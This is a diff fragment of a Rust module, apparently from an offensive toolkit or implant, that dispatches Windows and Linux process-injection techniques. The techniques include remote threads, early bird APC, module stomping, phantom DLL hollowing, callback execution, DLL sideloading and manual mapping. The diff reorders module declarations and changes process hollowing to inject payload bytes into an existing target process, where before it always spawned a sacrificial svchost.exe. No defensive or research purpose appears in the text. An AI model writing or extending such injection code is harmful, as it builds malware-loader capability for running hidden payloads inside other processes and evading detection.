@@ -1,23 +1,23 @@
 #[cfg(target_os = "linux")]
 pub mod linux_inject;
 
+#[cfg(all(windows, target_arch = "x86_64"))]
+pub mod callback_exec;
 pub mod dll_sideload;
 #[cfg(windows)]
 pub mod early_bird;
 #[cfg(windows)]
+pub mod existing_module_stomp;
+#[cfg(windows)]
 pub mod module_stomp;
 #[cfg(windows)]
 pub mod nt_create_thread;
+#[cfg(all(windows, feature = "phantom-dll-hollow"))]
+pub mod phantom_dll_hollow;
 #[cfg(windows)]
 pub mod remote_thread;
 #[cfg(windows)]
 pub mod thread_pool;
-#[cfg(windows)]
-pub mod existing_module_stomp;
-#[cfg(all(windows, feature = "phantom-dll-hollow"))]
-pub mod phantom_dll_hollow;
-#[cfg(all(windows, target_arch = "x86_64"))]
-pub mod callback_exec;
 
 #[cfg(windows)]
 #[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
@@ -289,16 +289,11 @@ pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> 
         InjectionMethod::RemoteThread => remote_thread::RemoteThreadInjector.inject(pid, payload),
         InjectionMethod::EarlyBird => early_bird::EarlyBirdInjector.inject(pid, payload),
         InjectionMethod::Hollowing => {
-            // True process hollowing: spawn a sacrificial svchost.exe and replace its image.
-            // The `pid` parameter is intentionally ignored; hollowing creates its own host.
-            if pid != 0 {
-                log::warn!(
-                    "InjectionMethod::Hollowing ignores the target pid ({pid}); \
-                     it always creates a new sacrificial process."
-                );
+            if pid == 0 {
+                hollowing::hollow_and_execute(payload).map_err(|e| anyhow::anyhow!("{}", e))
+            } else {
+                hollowing::inject_into_process(pid, payload).map_err(|e| anyhow::anyhow!("{}", e))
             }
-            let _ = pid;
-            hollowing::hollow_and_execute(payload).map_err(|e| anyhow::anyhow!("{}", e))
         }
         InjectionMethod::ManualMap => manual_map_inject(pid, payload),
         InjectionMethod::DllSideLoad => dll_sideload::DllSideLoadInjector.inject(pid, payload),
